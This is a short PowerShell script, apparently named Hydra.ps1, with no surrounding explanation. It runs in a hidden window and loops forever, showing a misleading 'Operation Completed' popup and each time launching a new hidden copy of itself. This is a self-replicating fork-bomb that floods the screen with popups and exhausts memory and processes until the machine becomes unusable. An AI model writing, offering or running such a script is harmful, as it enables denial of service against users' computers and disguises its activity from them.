Powershell.exe -windowstyle hidden {
$app = "cmd.exe"
$wshell = New-Object -ComObject Wscript.Shell
while ($true){
$wshell.Popup("Operation Completed",0,"Done",0x1)
Start-Process powershell.exe -Argumentlist "-file .\Hydra.ps1" -windowstyle hidden
}
}
